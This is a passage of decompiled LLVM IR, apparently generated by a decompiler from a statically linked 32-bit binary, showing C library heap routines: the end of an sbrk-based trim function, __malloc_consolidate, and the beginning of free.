  br i1 %tmp9, label %dec_label_pc_8061b6f, label %dec_label_pc_8061b1a

dec_label_pc_8061b1a:                             ; preds = %entry
  %v1_8061b1f = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8061b1f, i32* %edi.global-to-local, align 4
  %v0_8061b29 = load i32, i32* @esi, align 4
  store i32 %v0_8061b29, i32* %eax.global-to-local, align 4
  %v1_8061b2b = load i32, i32* %ebp.global-to-local, align 4
  %v2_8061b2b = add i32 %v1_8061b2b, 44
  %v3_8061b2b = inttoptr i32 %v2_8061b2b to i32*
  %v4_8061b2b = load i32, i32* %v3_8061b2b, align 4
  %v5_8061b2b = add i32 %v4_8061b2b, %v0_8061b29
  store i32 %v5_8061b2b, i32* %eax.global-to-local, align 4
  %v12_8061b2e = icmp eq i32 %v1_8061b1f, %v5_8061b2b
  %v1_8061b30 = icmp eq i1 %v12_8061b2e, false
  br i1 %v1_8061b30, label %dec_label_pc_8061b6f, label %dec_label_pc_8061b32

dec_label_pc_8061b32:                             ; preds = %dec_label_pc_8061b1a
  %v1_8061b35 = sub i32 0, %v4_8061b13
  store i32 %v1_8061b35, i32* @ebx, align 4
  %v1_8061b38 = call i32 @__GI_sbrk(i32 %v1_8061b35)
  store i32 %v1_8061b38, i32* %eax.global-to-local, align 4
  %v1_8061b44 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8061b44, i32* %eax.global-to-local, align 4
  %v10_8061b4c = icmp eq i32 %v1_8061b44, -1
  br i1 %v10_8061b4c, label %dec_label_pc_8061b6f, label %dec_label_pc_8061b51

dec_label_pc_8061b51:                             ; preds = %dec_label_pc_8061b32
  %v0_8061b51 = load i32, i32* %edi.global-to-local, align 4
  %v2_8061b53 = sub i32 %v0_8061b51, %v1_8061b44
  %v12_8061b53 = icmp eq i32 %v2_8061b53, 0
  store i32 %v2_8061b53, i32* @ecx, align 4
  br i1 %v12_8061b53, label %dec_label_pc_8061b6f, label %dec_label_pc_8061b57

dec_label_pc_8061b57:                             ; preds = %dec_label_pc_8061b51
  %v0_8061b57 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8061b57 = add i32 %v0_8061b57, 44
  %v2_8061b57 = inttoptr i32 %v1_8061b57 to i32*
  %v3_8061b57 = load i32, i32* %v2_8061b57, align 4
  store i32 %v3_8061b57, i32* %eax.global-to-local, align 4
  %v0_8061b5a = load i32, i32* @esi, align 4
  %v2_8061b5a = sub i32 %v0_8061b5a, %v2_8061b53
  store i32 %v2_8061b5a, i32* %esi.global-to-local, align 4
  %v1_8061b5c = add i32 %v0_8061b57, 872
  %v2_8061b5c = inttoptr i32 %v1_8061b5c to i32*
  %v3_8061b5c = load i32, i32* %v2_8061b5c, align 4
  %v5_8061b5c = sub i32 %v3_8061b5c, %v2_8061b53
  store i32 %v5_8061b5c, i32* %v2_8061b5c, align 4
  %v0_8061b62 = load i32, i32* %esi.global-to-local, align 4
  %v1_8061b62 = or i32 %v0_8061b62, 1
  store i32 %v1_8061b62, i32* %esi.global-to-local, align 4
  %v1_8061b65 = load i32, i32* %eax.global-to-local, align 4
  %v2_8061b65 = add i32 %v1_8061b65, 4
  %v3_8061b65 = inttoptr i32 %v2_8061b65 to i32*
  store i32 %v1_8061b62, i32* %v3_8061b65, align 4
  br label %dec_label_pc_8061b71

dec_label_pc_8061b6f:                             ; preds = %dec_label_pc_8061b51, %dec_label_pc_8061b32, %dec_label_pc_8061b1a, %entry
  br label %dec_label_pc_8061b71

dec_label_pc_8061b71:                             ; preds = %dec_label_pc_8061b57, %dec_label_pc_8061b6f
  %storemerge = phi i32 [ 1, %dec_label_pc_8061b57 ], [ 0, %dec_label_pc_8061b6f ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8061af0, i32* %esi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8061b44, { 1, 0, 2 }
  uselistorder i32 %v4_8061b13, { 1, 2, 0 }
  uselistorder i32 %v3_8061af5, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8061aed, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8061b71, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg1 to i32
  %v0_8061b79 = load i32, i32* @ebp, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  store i32 %tmp14, i32* @ebp, align 4
  %v2_8061b89 = load i32, i32* %arg1, align 4
  store i32 %v2_8061b89, i32* %eax.global-to-local, align 4
  %v1_8061b8c = icmp eq i32 %v2_8061b89, 0
  br i1 %v1_8061b8c, label %dec_label_pc_8061c8f.preheader, label %dec_label_pc_8061b94

dec_label_pc_8061c8f.preheader:                   ; preds = %entry
  %v4_8061c8f24 = add i32 %tmp14, 52
  store i32 %v4_8061c8f24, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  %v2_8061c9725 = add i32 %tmp14, 64
  %v3_8061c9726 = inttoptr i32 %v2_8061c9725 to i32*
  store i32 %v4_8061c8f24, i32* %v3_8061c9726, align 4
  %v0_8061c9a27 = load i32, i32* %eax.global-to-local, align 4
  %v2_8061c9a28 = add i32 %v0_8061c9a27, 8
  %v3_8061c9a29 = inttoptr i32 %v2_8061c9a28 to i32*
  store i32 %v0_8061c9a27, i32* %v3_8061c9a29, align 4
  %v0_8061c9f30 = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8061c8f.dec_label_pc_8061c8f_crit_edge

dec_label_pc_8061b94:                             ; preds = %entry
  %v1_8061b94 = and i32 %v2_8061b89, -3
  store i32 %v1_8061b94, i32* %eax.global-to-local, align 4
  store i32 %v1_8061b94, i32* %arg1, align 4
  %v2_8061b9a = udiv i32 %v1_8061b94, 8
  %v0_8061b9d = load i32, i32* @ebp, align 4
  %v1_8061b9d = add i32 %v0_8061b9d, 52
  store i32 %v1_8061b9d, i32* %edx.global-to-local, align 4
  %v2_8061ba0 = mul nuw i32 %v2_8061b9a, 4
  %v3_8061ba0 = add i32 %v2_8061ba0, -4
  %v4_8061ba0 = add i32 %v3_8061ba0, %v0_8061b9d
  store i32 %v4_8061ba0, i32* %eax.global-to-local, align 4
  %v1_8061ba4 = add i32 %v0_8061b9d, 4
  store i32 %v1_8061ba4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061bb3

dec_label_pc_8061bb3:                             ; preds = %dec_label_pc_8061c85, %dec_label_pc_8061b94
  %v0_8061bc1 = phi i32 [ %v4_8061c85, %dec_label_pc_8061c85 ], [ %v1_8061ba4, %dec_label_pc_8061b94 ]
  store i32 %v0_8061bc1, i32* %eax.global-to-local, align 4
  %v1_8061bb7 = inttoptr i32 %v0_8061bc1 to i32*
  %v2_8061bb7 = load i32, i32* %v1_8061bb7, align 4
  store i32 %v2_8061bb7, i32* @ecx, align 4
  %v1_8061bb9 = icmp eq i32 %v2_8061bb7, 0
  br i1 %v1_8061bb9, label %dec_label_pc_8061c7b, label %dec_label_pc_8061bc1

dec_label_pc_8061bc1:                             ; preds = %dec_label_pc_8061bb3
  store i32 0, i32* %v1_8061bb7, align 4
  %v0_8061bc7.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8061bc7

dec_label_pc_8061bc7:                             ; preds = %dec_label_pc_8061c6f, %dec_label_pc_8061bc1
  %v0_8061be4 = phi i32 [ %v3_8061bca, %dec_label_pc_8061c6f ], [ %v0_8061bc7.pre, %dec_label_pc_8061bc1 ]
  %v1_8061bc7 = add i32 %v0_8061be4, 4
  %v2_8061bc7 = inttoptr i32 %v1_8061bc7 to i32*
  %v3_8061bc7 = load i32, i32* %v2_8061bc7, align 4
  store i32 %v3_8061bc7, i32* %eax.global-to-local, align 4
  %v1_8061bca = add i32 %v0_8061be4, 8
  %v2_8061bca = inttoptr i32 %v1_8061bca to i32*
  %v3_8061bca = load i32, i32* %v2_8061bca, align 4
  %v1_8061bcf = and i32 %v3_8061bc7, -2
  store i32 %v1_8061bcf, i32* %edi.global-to-local, align 4
  %v2_8061bd2 = urem i32 %v3_8061bc7, 2
  %v3_8061bd2 = icmp eq i32 %v2_8061bd2, 0
  %v2_8061bd8 = add i32 %v1_8061bcf, %v0_8061be4
  store i32 %v2_8061bd8, i32* %edx.global-to-local, align 4
  %v1_8061bdb = add i32 %v2_8061bd8, 4
  %v2_8061bdb = inttoptr i32 %v1_8061bdb to i32*
  %v3_8061bdb = load i32, i32* %v2_8061bdb, align 4
  store i32 %v3_8061bdb, i32* %ebx.global-to-local, align 4
  %v1_8061be2 = icmp eq i1 %v3_8061bd2, false
  br i1 %v1_8061be2, label %dec_label_pc_8061c0c, label %dec_label_pc_8061be4

dec_label_pc_8061be4:                             ; preds = %dec_label_pc_8061bc7
  %v1_8061be4 = inttoptr i32 %v0_8061be4 to i32*
  %v2_8061be4 = load i32, i32* %v1_8061be4, align 4
  %v5_8061bec = sub i32 %v0_8061be4, %v2_8061be4
  store i32 %v5_8061bec, i32* %eax.global-to-local, align 4
  %v1_8061bf0 = add i32 %v5_8061bec, 8
  %v2_8061bf0 = inttoptr i32 %v1_8061bf0 to i32*
  %v3_8061bf0 = load i32, i32* %v2_8061bf0, align 4
  store i32 %v3_8061bf0, i32* %esi.global-to-local, align 4
  %v1_8061bf3 = add i32 %v5_8061bec, 12
  %v2_8061bf3 = inttoptr i32 %v1_8061bf3 to i32*
  %v3_8061bf3 = load i32, i32* %v2_8061bf3, align 4
  store i32 %v3_8061bf3, i32* %ebx.global-to-local, align 4
  %v1_8061bf6 = add i32 %v3_8061bf0, 12
  %v2_8061bf6 = inttoptr i32 %v1_8061bf6 to i32*
  %v3_8061bf6 = load i32, i32* %v2_8061bf6, align 4
  store i32 %v3_8061bf6, i32* @ecx, align 4
  %v12_8061bf9 = icmp eq i32 %v3_8061bf6, %v5_8061bec
  %v1_8061bfb = icmp eq i1 %v12_8061bf9, false
  br i1 %v1_8061bfb, label %dec_label_pc_8061c36, label %dec_label_pc_8061bfd

dec_label_pc_8061bfd:                             ; preds = %dec_label_pc_8061be4
  %v1_8061bfd = add i32 %v3_8061bf3, 8
  %v2_8061bfd = inttoptr i32 %v1_8061bfd to i32*
  %v3_8061bfd = load i32, i32* %v2_8061bfd, align 4
  %v15_8061bfd = icmp eq i32 %v3_8061bfd, %v3_8061bf6
  %v1_8061c00 = icmp eq i1 %v15_8061bfd, false
  br i1 %v1_8061c00, label %dec_label_pc_8061c36, label %dec_label_pc_8061c02

dec_label_pc_8061c02:                             ; preds = %dec_label_pc_8061bfd
  %v5_8061c02 = add i32 %v2_8061be4, %v1_8061bcf
  store i32 %v5_8061c02, i32* %edi.global-to-local, align 4
  store i32 %v3_8061bf3, i32* %v2_8061bf6, align 4
  %v0_8061c09 = load i32, i32* %esi.global-to-local, align 4
  %v1_8061c09 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8061c09 = add i32 %v1_8061c09, 8
  %v3_8061c09 = inttoptr i32 %v2_8061c09 to i32*
  store i32 %v0_8061c09, i32* %v3_8061c09, align 4
  %v0_8061c13.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8061c0c

dec_label_pc_8061c0c:                             ; preds = %dec_label_pc_8061bc7, %dec_label_pc_8061c02
  %v1_8061c1c = phi i32 [ %v2_8061bd8, %dec_label_pc_8061bc7 ], [ %v0_8061c13.pre, %dec_label_pc_8061c02 ]
  %v1_8061c10 = and i32 %v3_8061bdb, -4
  store i32 %v1_8061c10, i32* %esi.global-to-local, align 4
  %v1_8061c13 = load i32, i32* @ebp, align 4
  %v2_8061c13 = add i32 %v1_8061c13, 44
  %v3_8061c13 = inttoptr i32 %v2_8061c13 to i32*
  %v4_8061c13 = load i32, i32* %v3_8061c13, align 4
  %v15_8061c13 = icmp eq i32 %v1_8061c1c, %v4_8061c13
  br i1 %v15_8061c13, label %dec_label_pc_8061c63, label %dec_label_pc_8061c18

dec_label_pc_8061c18:                             ; preds = %dec_label_pc_8061c0c
  %v2_8061c18 = add i32 %v1_8061c1c, 4
  %v3_8061c18 = add i32 %v2_8061c18, %v1_8061c10
  %v4_8061c18 = inttoptr i32 %v3_8061c18 to i32*
  %v5_8061c18 = load i32, i32* %v4_8061c18, align 4
  store i32 %v5_8061c18, i32* %eax.global-to-local, align 4
  %v3_8061c1c = inttoptr i32 %v2_8061c18 to i32*
  store i32 %v1_8061c10, i32* %v3_8061c1c, align 4
  %v0_8061c1f = load i32, i32* %eax.global-to-local, align 4
  %v1_8061c1f = urem i32 %v0_8061c1f, 2
  %v2_8061c1f = icmp eq i32 %v1_8061c1f, 0
  store i32 %v1_8061c1f, i32* %eax.global-to-local, align 4
  %v1_8061c24 = icmp eq i1 %v2_8061c1f, false
  br i1 %v1_8061c24, label %dec_label_pc_8061c43, label %dec_label_pc_8061c26

dec_label_pc_8061c26:                             ; preds = %dec_label_pc_8061c18
  %v0_8061c26 = load i32, i32* %edx.global-to-local, align 4
  %v1_8061c26 = add i32 %v0_8061c26, 8
  %v2_8061c26 = inttoptr i32 %v1_8061c26 to i32*
  %v3_8061c26 = load i32, i32* %v2_8061c26, align 4
  store i32 %v3_8061c26, i32* %ebx.global-to-local, align 4
  %v1_8061c29 = add i32 %v0_8061c26, 12
  %v2_8061c29 = inttoptr i32 %v1_8061c29 to i32*
  %v3_8061c29 = load i32, i32* %v2_8061c29, align 4
  store i32 %v3_8061c29, i32* %eax.global-to-local, align 4
  %v1_8061c2c = add i32 %v3_8061c26, 12
  %v2_8061c2c = inttoptr i32 %v1_8061c2c to i32*
  %v3_8061c2c = load i32, i32* %v2_8061c2c, align 4
  %v15_8061c2c = icmp eq i32 %v3_8061c2c, %v0_8061c26
  %v1_8061c2f = icmp eq i1 %v15_8061c2c, false
  br i1 %v1_8061c2f, label %dec_label_pc_8061c36, label %dec_label_pc_8061c31

dec_label_pc_8061c31:                             ; preds = %dec_label_pc_8061c26
  %v1_8061c31 = add i32 %v3_8061c29, 8
  %v2_8061c31 = inttoptr i32 %v1_8061c31 to i32*
  %v3_8061c31 = load i32, i32* %v2_8061c31, align 4
  %v15_8061c31 = icmp eq i32 %v3_8061c31, %v0_8061c26
  br i1 %v15_8061c31, label %dec_label_pc_8061c3b, label %dec_label_pc_8061c36

dec_label_pc_8061c36:                             ; preds = %dec_label_pc_8061c31, %dec_label_pc_8061c26, %dec_label_pc_8061bfd, %dec_label_pc_8061be4
  %v0_8061c36 = call i32 @abort()
  store i32 %v0_8061c36, i32* %eax.global-to-local, align 4
  %v1_8061c3d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8061c3b

dec_label_pc_8061c3b:                             ; preds = %dec_label_pc_8061c31, %dec_label_pc_8061c36
  %v1_8061c3d = phi i32 [ %v3_8061c26, %dec_label_pc_8061c31 ], [ %v1_8061c3d.pre, %dec_label_pc_8061c36 ]
  %v0_8061c3d = phi i32 [ %v3_8061c29, %dec_label_pc_8061c31 ], [ %v0_8061c36, %dec_label_pc_8061c36 ]
  %v0_8061c3b = load i32, i32* %edi.global-to-local, align 4
  %v1_8061c3b = load i32, i32* %esi.global-to-local, align 4
  %v2_8061c3b = add i32 %v1_8061c3b, %v0_8061c3b
  store i32 %v2_8061c3b, i32* %edi.global-to-local, align 4
  %v2_8061c3d = add i32 %v1_8061c3d, 12
  %v3_8061c3d = inttoptr i32 %v2_8061c3d to i32*
  store i32 %v0_8061c3d, i32* %v3_8061c3d, align 4
  %v0_8061c40 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8061c40 = load i32, i32* %eax.global-to-local, align 4
  %v2_8061c40 = add i32 %v1_8061c40, 8
  %v3_8061c40 = inttoptr i32 %v2_8061c40 to i32*
  store i32 %v0_8061c40, i32* %v3_8061c40, align 4
  br label %dec_label_pc_8061c43

dec_label_pc_8061c43:                             ; preds = %dec_label_pc_8061c18, %dec_label_pc_8061c3b
  store i32 %v1_8061b9d, i32* %ebx.global-to-local, align 4
  %v0_8061c47 = load i32, i32* %edi.global-to-local, align 4
  %v1_8061c49 = or i32 %v0_8061c47, 1
  store i32 %v1_8061c49, i32* %eax.global-to-local, align 4
  %v1_8061c4c = load i32, i32* @ecx, align 4
  %v2_8061c4c = add i32 %v1_8061c4c, 4
  %v3_8061c4c = inttoptr i32 %v2_8061c4c to i32*
  store i32 %v1_8061c49, i32* %v3_8061c4c, align 4
  %v0_8061c4f = load i32, i32* %edi.global-to-local, align 4
  %v1_8061c4f = load i32, i32* @ecx, align 4
  %v3_8061c4f = add i32 %v1_8061c4f, %v0_8061c4f
  %v4_8061c4f = inttoptr i32 %v3_8061c4f to i32*
  store i32 %v0_8061c4f, i32* %v4_8061c4f, align 4
  %v0_8061c52 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8061c52 = add i32 %v0_8061c52, 8
  %v2_8061c52 = inttoptr i32 %v1_8061c52 to i32*
  %v3_8061c52 = load i32, i32* %v2_8061c52, align 4
  store i32 %v3_8061c52, i32* %edx.global-to-local, align 4
  %v0_8061c55 = load i32, i32* @ecx, align 4
  store i32 %v0_8061c55, i32* %v2_8061c52, align 4
  %v0_8061c58 = load i32, i32* @ecx, align 4
  %v1_8061c58 = load i32, i32* %edx.global-to-local, align 4
  %v2_8061c58 = add i32 %v1_8061c58, 12
  %v3_8061c58 = inttoptr i32 %v2_8061c58 to i32*
  store i32 %v0_8061c58, i32* %v3_8061c58, align 4
  %v0_8061c5b = load i32, i32* %edx.global-to-local, align 4
  %v1_8061c5b = load i32, i32* @ecx, align 4
  %v2_8061c5b = add i32 %v1_8061c5b, 8
  %v3_8061c5b = inttoptr i32 %v2_8061c5b to i32*
  store i32 %v0_8061c5b, i32* %v3_8061c5b, align 4
  %v0_8061c5e = load i32, i32* %ebx.global-to-local, align 4
  %v1_8061c5e = load i32, i32* @ecx, align 4
  %v2_8061c5e = add i32 %v1_8061c5e, 12
  %v3_8061c5e = inttoptr i32 %v2_8061c5e to i32*
  store i32 %v0_8061c5e, i32* %v3_8061c5e, align 4
  br label %dec_label_pc_8061c6f

dec_label_pc_8061c63:                             ; preds = %dec_label_pc_8061c0c
  %v0_8061c63 = load i32, i32* %edi.global-to-local, align 4
  %v2_8061c63 = add i32 %v0_8061c63, %v1_8061c10
  %v1_8061c66 = or i32 %v2_8061c63, 1
  store i32 %v1_8061c66, i32* %eax.global-to-local, align 4
  %v1_8061c69 = load i32, i32* @ecx, align 4
  %v2_8061c69 = add i32 %v1_8061c69, 4
  %v3_8061c69 = inttoptr i32 %v2_8061c69 to i32*
  store i32 %v1_8061c66, i32* %v3_8061c69, align 4
  %v0_8061c6c = load i32, i32* @ecx, align 4
  %v1_8061c6c = load i32, i32* @ebp, align 4
  %v2_8061c6c = add i32 %v1_8061c6c, 44
  %v3_8061c6c = inttoptr i32 %v2_8061c6c to i32*
  store i32 %v0_8061c6c, i32* %v3_8061c6c, align 4
  br label %dec_label_pc_8061c6f

dec_label_pc_8061c6f:                             ; preds = %dec_label_pc_8061c43, %dec_label_pc_8061c63
  store i32 %v3_8061bca, i32* @ecx, align 4
  %v1_8061c73 = icmp eq i32 %v3_8061bca, 0
  %v1_8061c75 = icmp eq i1 %v1_8061c73, false
  br i1 %v1_8061c75, label %dec_label_pc_8061bc7, label %dec_label_pc_8061c7b

dec_label_pc_8061c7b:                             ; preds = %dec_label_pc_8061c6f, %dec_label_pc_8061bb3
  store i32 %v4_8061ba0, i32* %eax.global-to-local, align 4
  %v15_8061c7f = icmp eq i32 %v0_8061bc1, %v4_8061ba0
  br i1 %v15_8061c7f, label %dec_label_pc_8061cf3, label %dec_label_pc_8061c85

dec_label_pc_8061c85:                             ; preds = %dec_label_pc_8061c7b
  %v4_8061c85 = add i32 %v0_8061bc1, 4
  br label %dec_label_pc_8061bb3

dec_label_pc_8061c8f.dec_label_pc_8061c8f_crit_edge: ; preds = %dec_label_pc_8061c8f.preheader, %dec_label_pc_8061c8f.dec_label_pc_8061c8f_crit_edge
  %v0_8061c9f31 = phi i32 [ %v0_8061c9f30, %dec_label_pc_8061c8f.preheader ], [ %v0_8061c9f, %dec_label_pc_8061c8f.dec_label_pc_8061c8f_crit_edge ]
  %v1_8061c8f.pre = load i32, i32* %edx.global-to-local, align 4
  %v2_8061c8f = mul i32 %v1_8061c8f.pre, 8
  %v3_8061c8f = add i32 %v0_8061c9f31, 44
  %v4_8061c8f = add i32 %v3_8061c8f, %v2_8061c8f
  store i32 %v4_8061c8f, i32* %eax.global-to-local, align 4
  %v1_8061c93 = add i32 %v1_8061c8f.pre, 1
  store i32 %v1_8061c93, i32* %edx.global-to-local, align 4
  %v2_8061c97 = add i32 %v4_8061c8f, 12
  %v3_8061c97 = inttoptr i32 %v2_8061c97 to i32*
  store i32 %v4_8061c8f, i32* %v3_8061c97, align 4
  %v0_8061c9a = load i32, i32* %eax.global-to-local, align 4
  %v2_8061c9a = add i32 %v0_8061c9a, 8
  %v3_8061c9a = inttoptr i32 %v2_8061c9a to i32*
  store i32 %v0_8061c9a, i32* %v3_8061c9a, align 4
  %v7_8061c9d = icmp sgt i32 %v1_8061c93, 95
  %v0_8061c9f = load i32, i32* @ebp, align 4
  br i1 %v7_8061c9d, label %dec_label_pc_8061c9f, label %dec_label_pc_8061c8f.dec_label_pc_8061c8f_crit_edge

dec_label_pc_8061c9f:                             ; preds = %dec_label_pc_8061c8f.dec_label_pc_8061c8f_crit_edge
  %v1_8061c9f = inttoptr i32 %v0_8061c9f to i32*
  %v2_8061c9f = load i32, i32* %v1_8061c9f, align 4
  store i32 %v2_8061c9f, i32* %eax.global-to-local, align 4
  %v1_8061ca5 = add i32 %v0_8061c9f, 864
  %v2_8061ca5 = inttoptr i32 %v1_8061ca5 to i32*
  %v3_8061ca5 = load i32, i32* %v2_8061ca5, align 4
  %v4_8061ca5 = or i32 %v3_8061ca5, 1
  store i32 %v4_8061ca5, i32* %v2_8061ca5, align 4
  %v0_8061cac = load i32, i32* @ebp, align 4
  %v1_8061cac = add i32 %v0_8061cac, 840
  %v2_8061cac = inttoptr i32 %v1_8061cac to i32*
  store i32 0, i32* %v2_8061cac, align 4
  %v0_8061cb6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8061cb6 = urem i32 %v0_8061cb6, 4
  %v1_8061cb9 = or i32 %v1_8061cb6, 72
  %v1_8061cbc = load i32, i32* @ebp, align 4
  %v2_8061cbc = inttoptr i32 %v1_8061cbc to i32*
  store i32 %v1_8061cb9, i32* %v2_8061cbc, align 4
  %v0_8061cbf = load i32, i32* @ebp, align 4
  %v1_8061cbf = add i32 %v0_8061cbf, 52
  store i32 %v1_8061cbf, i32* %eax.global-to-local, align 4
  %v1_8061cc2 = add i32 %v0_8061cbf, 852
  %v2_8061cc2 = inttoptr i32 %v1_8061cc2 to i32*
  store i32 65536, i32* %v2_8061cc2, align 4
  %v0_8061ccc = load i32, i32* @ebp, align 4
  %v1_8061ccc = add i32 %v0_8061ccc, 844
  %v2_8061ccc = inttoptr i32 %v1_8061ccc to i32*
  store i32 262144, i32* %v2_8061ccc, align 4
  %v0_8061cd6 = load i32, i32* @ebp, align 4
  %v1_8061cd6 = add i32 %v0_8061cd6, 836
  %v2_8061cd6 = inttoptr i32 %v1_8061cd6 to i32*
  store i32 262144, i32* %v2_8061cd6, align 4
  %v0_8061ce0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8061ce0 = load i32, i32* @ebp, align 4
  %v2_8061ce0 = add i32 %v1_8061ce0, 44
  %v3_8061ce0 = inttoptr i32 %v2_8061ce0 to i32*
  store i32 %v0_8061ce0, i32* %v3_8061ce0, align 4
  %v1_8061ce5 = call i32 @sysconf(i32 30)
  store i32 %v1_8061ce5, i32* %eax.global-to-local, align 4
  %v1_8061ced = load i32, i32* @ebp, align 4
  %v2_8061ced = add i32 %v1_8061ced, 860
  %v3_8061ced = inttoptr i32 %v2_8061ced to i32*
  store i32 %v1_8061ce5, i32* %v3_8061ced, align 4
  %v0_8061cfa.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061cf3

dec_label_pc_8061cf3:                             ; preds = %dec_label_pc_8061c7b, %dec_label_pc_8061c9f
  %v0_8061cfa = phi i32 [ %v0_8061cfa.pre, %dec_label_pc_8061c9f ], [ %v4_8061ba0, %dec_label_pc_8061c7b ]
  store i32 %v0_8061b79, i32* @ebp, align 4
  ret i32 %v0_8061cfa

; uselistorder directives
  uselistorder i32 %v0_8061c9a, { 1, 0 }
  uselistorder i32 %v0_8061c4f, { 1, 0 }
  uselistorder i32 %v1_8061c1f, { 1, 0 }
  uselistorder i32 %v2_8061c18, { 1, 0 }
  uselistorder i32 %v1_8061c10, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8061c1c, { 1, 0 }
  uselistorder i32 %v0_8061be4, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8061bc1, { 1, 0, 3, 2 }
  uselistorder i32 %v4_8061ba0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8061b9d, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 2, 1, 3, 4, 5, 7, 6, 8, 9, 0, 10 }
  uselistorder i32* %edi.global-to-local, { 5, 2, 3, 0, 4, 1, 6 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 19, 20, 21, 22, 23, 0, 1, 24 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_8061cf3, { 1, 0 }
  uselistorder label %dec_label_pc_8061c8f.dec_label_pc_8061c8f_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8061c6f, { 1, 0 }
  uselistorder label %dec_label_pc_8061c43, { 1, 0 }
  uselistorder label %dec_label_pc_8061c3b, { 1, 0 }
  uselistorder label %dec_label_pc_8061c0c, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8061cfb = load i32, i32* @ebp, align 4
  %v0_8061cfc = load i32, i32* @edi, align 4
  %v0_8061cfd = load i32, i32* @esi, align 4
  %v0_8061cfe = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebp, align 4
  %v1_8061d06 = icmp eq i32 %arg1, 0
  br i1 %v1_8061d06, label %dec_label_pc_8061e92, label %dec_label_pc_8061d0e

dec_label_pc_8061d0e:                             ; preds = %entry
  %v2_8061d19 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8061d19, i32* %eax.global-to-local, align 4
  %v1_8061d1e = add i32 %arg1, -8
  store i32 %v1_8061d1e, i32* %ebx.global-to-local, align 4
  %v4_8061d21 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134623208, i32 ptrtoint (i32* @global_var_80719f8.1606 to i32))
  store i32 %v4_8061d21, i32* %eax.global-to-local, align 4
  store i32 %v1_8061d1e, i32* @edi, align 4
  %v1_8061d2f = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80719f8.1606 to i32))
  store i32 %v1_8061d2f, i32* %eax.global-to-local, align 4
  %v1_8061d34 = add i32 %arg1, -4
  %v2_8061d34 = inttoptr i32 %v1_8061d34 to i32*
  %v3_8061d34 = load i32, i32* %v2_8061d34, align 4
  store i32 %v3_8061d34, i32* %edx.global-to-local, align 4
  %v0_8061d3a = load i8, i8* @global_var_80788d0.1607, align 1
  %v1_8061d3a = sext i8 %v0_8061d3a to i32
  store i32 %v1_8061d3a, i32* %eax.global-to-local, align 4
  %v1_8061d41 = and i32 %v3_8061d34, -4
  %v4_8061d41 = trunc i32 %v1_8061d41 to i8
  store i32 %v1_8061d41, i32* @ecx, align 4
  %v8_8061d46 = icmp ugt i8 %v4_8061d41, %v0_8061d3a
  br i1 %v8_8061d46, label %dec_label_pc_8061d6b, label %dec_label_pc_8061d48

dec_label_pc_8061d48:                             ; preds = %dec_label_pc_8061d0e
  %v1_8061d4a = or i32 %v1_8061d3a, 3
  %v3_8061d4a = trunc i32 %v1_8061d4a to i8
  store i32 %v1_8061d4a, i32* %eax.global-to-local, align 4
  %v2_8061d4d = udiv i32 %v3_8061d34, 8
  store i32 %v2_8061d4d, i32* %edx.global-to-local, align 4
  store i8 %v3_8061d4a, i8* @global_var_80788d0.1607, align 16
  %v1_8061d55 = mul nuw i32 %v2_8061d4d, 4
  %v2_8061d55 = add i32 %v1_8061d55, ptrtoint (i32* @global_var_80788cc.1608 to i32)
  %v3_8061d55 = inttoptr i32 %v2_8061d55 to i32*
  %v4_8061d55 = load i32, i32* %v3_8061d55, align 4
  store i32 %v4_8061d55, i32* %eax.global-to-local, align 4
  %v3_8061d5c = inttoptr i32 %arg1 to i32*
  store i32 %v4_8061d55, i32* %v3_8061d5c, align 4
  %v0_8061d5f = load i32, i32* %ebx.global-to-local, align 4
  %v1_8061d5f = load i32, i32* %edx.global-to-local, align 4
  %v2_8061d5f = mul i32 %v1_8061d5f, 4
  %v3_8061d5f = add i32 %v2_8061d5f, ptrtoint (i32* @global_var_80788cc.1608 to i32)
  %v4_8061d5f = inttoptr i32 %v3_8061d5f to i32*
  store i32 %v0_8061d5f, i32* %v4_8061d5f, align 4
  br label %dec_label_pc_8061e81

dec_label_pc_8061d6b:                             ; preds = %dec_label_pc_8061d0e
  %v2_8061d6b = and i32 %v3_8061d34, 2
